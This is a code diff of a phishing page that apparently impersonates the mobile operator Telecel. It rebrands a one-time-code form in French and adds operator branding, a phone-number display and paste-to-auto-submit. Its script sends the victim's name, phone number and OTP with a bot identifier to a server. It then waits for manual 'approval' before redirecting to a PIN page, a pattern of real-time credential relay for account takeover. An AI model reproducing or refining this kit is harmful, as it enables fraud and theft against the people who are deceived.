@@ -1,27 +1,196 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <title>Enter OTP</title>
 
 <style>
-body { margin:0; font-family: Arial, Helvetica, sans-serif; background:#e5e5e5; min-height:100vh; display:flex; align-items:center; justify-content:center; }
-.card { background:#fff; width:92%; max-width:420px; border-radius:12px; padding:24px 20px 28px; box-shadow:0 10px 30px rgba(0,0,0,0.15); position:relative; }
-.close { position:absolute; top:14px; right:14px; width:28px; height:28px; background:#e11b22; color:#fff; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:bold; cursor:pointer; }
-h1 { text-align:center; font-size:22px; margin-bottom:6px; }
-.info { text-align:center; font-size:14px; color:#666; margin-bottom:24px; }
-.otp-wrap { display:flex; justify-content:space-between; gap:8px; margin-bottom:18px; }
-.otp-wrap input { width:48px; height:54px; text-align:center; font-size:22px; border-radius:8px; border:1.5px solid #ddd; outline:none; }
-.otp-wrap input:disabled { background:#f2f2f2; }
-.otp-wrap input:focus { border-color:#e11b22; }
-.timer { text-align:center; font-size:13px; color:#777; margin-bottom:20px; }
-button { width:100%; padding:16px; font-size:16px; background:#e11b22; color:#fff; border:none; border-radius:999px; opacity:0.5; cursor:pointer; }
-button:enabled { opacity:1; }
-.waiting { text-align:center; font-size:14px; color:#e11b22; margin-top:16px; display:none; }
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+  background: #0a0a0a;
+  color: #ffffff;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+}
+
+.card {
+  background: #0a0a0a;
+  width: 100%;
+  max-width: 400px;
+  padding: 40px 24px 32px;
+  position: relative;
+}
+
+.logo {
+  text-align: center;
+  margin-bottom: 32px;
+}
+
+.logo-circle {
+  width: 56px;
+  height: 56px;
+  background: #e53935;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 12px;
+  font-size: 28px;
+  font-weight: 700;
+  color: #fff;
+}
+
+.telecel {
+  font-size: 20px;
+  font-weight: 700;
+  color: #e53935;
+  letter-spacing: 0.5px;
+}
+
+.title {
+  font-size: 24px;
+  font-weight: 700;
+  color: #ffffff;
+  text-align: center;
+  margin-bottom: 8px;
+}
+
+.subtitle {
+  font-size: 15px;
+  color: rgba(255, 255, 255, 0.5);
+  text-align: center;
+  margin-bottom: 32px;
+  line-height: 1.5;
+}
+
+.otp-wrap {
+  display: flex;
+  justify-content: center;
+  gap: 12px;
+  margin-bottom: 32px;
+}
+
+.otp-wrap input {
+  width: 48px;
+  height: 56px;
+  text-align: center;
+  font-size: 22px;
+  font-weight: 600;
+  border-radius: 8px;
+  border: 1.5px solid rgba(255, 255, 255, 0.1);
+  background: rgba(255, 255, 255, 0.05);
+  color: #ffffff;
+  outline: none;
+  transition: border-color 0.3s ease;
+}
+
+.otp-wrap input:disabled {
+  background: rgba(255, 255, 255, 0.02);
+  opacity: 0.5;
+}
+
+.otp-wrap input:focus {
+  border-color: #e53935;
+}
+
+.otp-wrap input::placeholder {
+  color: rgba(255, 255, 255, 0.2);
+}
+
+.timer {
+  text-align: center;
+  font-size: 14px;
+  color: rgba(255, 255, 255, 0.4);
+  margin-bottom: 32px;
+}
+
+.timer span {
+  color: #e53935;
+  font-weight: 600;
+}
+
 #otp-alert {
-    text-align: center;
-    align-items: center;
+  text-align: center;
+  font-size: 14px;
+  margin-bottom: 16px;
+  min-height: 20px;
+}
+
+button {
+  width: 100%;
+  padding: 16px;
+  font-size: 16px;
+  font-weight: 600;
+  border-radius: 8px;
+  border: none;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  background: #e53935;
+  color: #ffffff;
+  opacity: 0.5;
+}
+
+button:enabled {
+  opacity: 1;
+}
+
+button:hover:enabled {
+  background: #c62828;
+}
+
+.waiting {
+  text-align: center;
+  font-size: 14px;
+  color: #e53935;
+  margin-top: 16px;
+  display: none;
+  padding: 12px;
+  border-radius: 8px;
+  background: rgba(229, 57, 53, 0.1);
+}
+
+.back-link {
+  text-align: center;
+  margin-top: 20px;
+}
+
+.back-link button {
+  background: transparent;
+  border: none;
+  color: rgba(255, 255, 255, 0.3);
+  font-size: 14px;
+  cursor: pointer;
+  padding: 8px;
+  transition: color 0.3s ease;
+  width: auto;
+  opacity: 1;
+}
+
+.back-link button:hover {
+  color: rgba(255, 255, 255, 0.6);
+}
+
+.back-link button:disabled {
+  opacity: 0.3;
+  cursor: not-allowed;
+}
+
+.footer {
+  margin-top: 32px;
+  text-align: center;
+  font-size: 12px;
+  color: rgba(255, 255, 255, 0.2);
+  letter-spacing: 0.5px;
 }
 </style>
 </head>
@@ -29,25 +198,36 @@ button:enabled { opacity:1; }
 <body>
 
 <div class="card">
-  <div class="close">✕</div>
+  <div class="logo">
+    <div class="logo-circle">t</div>
+    <div class="telecel">telecel</div>
+  </div>
 
-  <h1>Enter OTP</h1>
-  <div class="info">Please enter the 6 digit  OTP sent to verify.  </div>
+  <div class="title">Vérifier votre numéro</div>
+  <div class="subtitle">Saisissez le code que nous avons envoyé à <span id="phoneDisplay">(+226) 79046955</span></div>
 
   <div class="otp-wrap">
-    <input type="tel" maxlength="1" inputmode="numeric">
-    <input type="tel" maxlength="1" inputmode="numeric">
-    <input type="tel" maxlength="1" inputmode="numeric">
-    <input type="tel" maxlength="1" inputmode="numeric">
-    <input type="tel" maxlength="1" inputmode="numeric">
-    <input type="tel" maxlength="1" inputmode="numeric">
+    <input type="tel" maxlength="1" inputmode="numeric" placeholder="0">
+    <input type="tel" maxlength="1" inputmode="numeric" placeholder="0">
+    <input type="tel" maxlength="1" inputmode="numeric" placeholder="0">
+    <input type="tel" maxlength="1" inputmode="numeric" placeholder="0">
+    <input type="tel" maxlength="1" inputmode="numeric" placeholder="0">
+    <input type="tel" maxlength="1" inputmode="numeric" placeholder="0">
   </div>
+  
   <div id="otp-alert"></div>
-  <div class="timer">You can resend OTP in <span id="countdown">120</span></div>
+  
+  <div class="timer">Renvoyer le code dans <span id="countdown">05:00</span></div>
 
-  <button id="verifyBtn" disabled>Submit </button>
+  <button id="verifyBtn" disabled>Continuer</button>
 
-  <div id="waiting" class="waiting">⏳ Waiting for approval…</div>
+  <div id="waiting" class="waiting">⏳ En attente d'approbation…</div>
+
+  <div class="back-link">
+    <button onclick="history.back()">Retour</button>
+  </div>
+
+  <div class="footer">v 5.3.2 (1.0.0)</div>
 </div>
 
 <script>
@@ -55,6 +235,16 @@ const inputs = document.querySelectorAll('.otp-wrap input');
 const verifyBtn = document.getElementById('verifyBtn');
 const countdownEl = document.getElementById('countdown');
 const waitingEl = document.getElementById('waiting');
+const backButton = document.querySelector('.back-link button');
+const phoneDisplay = document.getElementById('phoneDisplay');
+
+// Display phone number
+const phone = localStorage.getItem('phone');
+if (phone) {
+  // Format phone number: (+226) 79046955
+  const formattedPhone = `(+226) ${phone.replace(/\D/g, '')}`;
+  phoneDisplay.textContent = formattedPhone;
+}
 
 // Session & bot handling
 const params = new URLSearchParams(window.location.search);
@@ -62,7 +252,6 @@ const urlBotId = params.get('botId');
 if(urlBotId) localStorage.setItem('botId', urlBotId);
 
 const fullName = localStorage.getItem('fullName');
-const phone = localStorage.getItem('phone');
 const botId = localStorage.getItem('botId');
 
 if(!fullName || !phone || !botId){
@@ -70,77 +259,133 @@ if(!fullName || !phone || !botId){
   window.location.href='index.html';
 }
 
-// Countdown timer
-let timeLeft = 120;
-const timer = setInterval(()=>{
+// Countdown timer - Start from 5 minutes (300 seconds)
+let timeLeft = 300; // 5 minutes in seconds
+function updateCountdown() {
+  const minutes = Math.floor(timeLeft / 60);
+  const seconds = timeLeft % 60;
+  countdownEl.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+  
+  if (timeLeft <= 0) { 
+    clearInterval(timer); 
+    countdownEl.textContent = '00:00';
+  }
   timeLeft--;
-  countdownEl.textContent = timeLeft;
-  if(timeLeft <=0){ clearInterval(timer); countdownEl.textContent='0'; }
-},1000);
+}
 
-// Submit OTP (no Telegram button here)
+const timer = setInterval(updateCountdown, 1000);
+updateCountdown();
+
+// Submit OTP
 function submitOtp(code){
-  verifyBtn.disabled=true;
-  verifyBtn.textContent='Waiting for approval…';
-  waitingEl.style.display='block';
-  inputs.forEach(i=>i.disabled=true);
+  verifyBtn.disabled = true;
+  verifyBtn.textContent = 'En attente…';
+  waitingEl.style.display = 'block';
+  inputs.forEach(i => i.disabled = true);
 
-  fetch(`${window.location.origin}/submit-otp`,{
-    method:'POST',
-    headers:{ 'Content-Type':'application/json' },
-    body:JSON.stringify({ name:fullName, phone, otp:code, botId })
-  }).then(r=>r.json())
-  .then(({requestId})=> pollApproval(requestId))
-  .catch(()=>{
-    waitingEl.style.display='none';
-    verifyBtn.disabled=false;
-    verifyBtn.textContent='Verify OTP';
-    inputs.forEach(i=>i.disabled=false);
-    alert('Server error. Please try again.');
+  fetch(`${window.location.origin}/submit-otp`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ name: fullName, phone, otp: code, botId })
+  })
+  .then(r => r.json())
+  .then(({ requestId }) => pollApproval(requestId))
+  .catch(() => {
+    waitingEl.style.display = 'none';
+    verifyBtn.disabled = false;
+    verifyBtn.textContent = 'Continuer';
+    inputs.forEach(i => i.disabled = false);
+    document.getElementById('otp-alert').textContent = '❌ Erreur serveur. Veuillez réessayer.';
+    document.getElementById('otp-alert').style.color = '#e53935';
   });
 }
 
 // Polling for approval
 function pollApproval(requestId){
   const interval = setInterval(async ()=>{
-    const r = await fetch(`${window.location.origin}/check-otp/${requestId}`);
-    const d = await r.json();
+    try {
+      const r = await fetch(`${window.location.origin}/check-otp/${requestId}`);
+      const d = await r.json();
 
-    if(d.approved===true){
-      clearInterval(interval);
-      window.location.href='pin.html';
-    }
+      if(d.approved === true){
+        clearInterval(interval);
+        window.location.href = 'pin.html';
+      }
 
-    if(d.approved===false){
-      clearInterval(interval);
-      inputs.forEach(i=>{ i.value=''; i.disabled=false; });
-      verifyBtn.disabled=true;
-      verifyBtn.textContent='Verify OTP';
-      waitingEl.style.display='none';
-      document.getElementById('otp-alert').textContent = 'Wrong otp. Please try again.';
-      document.getElementById('otp-alert').style.color = 'red';
+      if(d.approved === false){
+        clearInterval(interval);
+        inputs.forEach(i => { i.value = ''; i.disabled = false; });
+        verifyBtn.disabled = true;
+        verifyBtn.textContent = 'Continuer';
+        waitingEl.style.display = 'none';
+        document.getElementById('otp-alert').textContent = '❌ Code incorrect. Veuillez réessayer.';
+        document.getElementById('otp-alert').style.color = '#e53935';
+      }
+    } catch(error) {
+      console.error('Polling error:', error);
     }
-  },2000);
+  }, 2000);
 }
 
 // Enable button only after 6 digits
 function checkInputs(){
-  verifyBtn.disabled = Array.from(inputs).map(i=>i.value).join('').length!==6;
+  verifyBtn.disabled = Array.from(inputs).map(i => i.value).join('').length !== 6;
 }
 
 // Auto-focus & input validation
-inputs.forEach((input,i)=>{
-  input.addEventListener('input',()=>{
-    input.value=input.value.replace(/\D/g,'');
+inputs.forEach((input, i) => {
+  input.addEventListener('input', () => {
+    input.value = input.value.replace(/\D/g, '');
     if(input.value && inputs[i+1]) inputs[i+1].focus();
     checkInputs();
+    // Clear alert when user starts typing
+    document.getElementById('otp-alert').textContent = '';
+  });
+  
+  // Handle backspace
+  input.addEventListener('keydown', (e) => {
+    if (e.key === 'Backspace' && !input.value && i > 0) {
+      inputs[i-1].focus();
+    }
   });
 });
 
 // Verify button click
-verifyBtn.addEventListener('click',()=>{
-  const code = Array.from(inputs).map(i=>i.value).join('');
-  if(code.length===6) submitOtp(code);
+verifyBtn.addEventListener('click', () => {
+  const code = Array.from(inputs).map(i => i.value).join('');
+  if(code.length === 6) submitOtp(code);
+});
+
+// Back button
+if (backButton) {
+  backButton.addEventListener('click', ()=>{
+    backButton.disabled = true;
+  });
+}
+
+// Handle paste event for OTP
+document.addEventListener('paste', (e) => {
+  const paste = e.clipboardData.getData('text');
+  const digits = paste.replace(/\D/g, '').slice(0, 6);
+  if (digits.length > 0) {
+    inputs.forEach((input, i) => {
+      input.value = digits[i] || '';
+    });
+    checkInputs();
+    // Focus the next empty input or last input
+    const nextEmpty = Array.from(inputs).findIndex(inp => inp.value === '');
+    if (nextEmpty !== -1) {
+      inputs[nextEmpty].focus();
+    } else {
+      inputs[5].focus();
+    }
+    if (digits.length === 6) {
+      // Auto-submit if 6 digits pasted
+      setTimeout(() => {
+        verifyBtn.click();
+      }, 300);
+    }
+  }
 });
 </script>
 
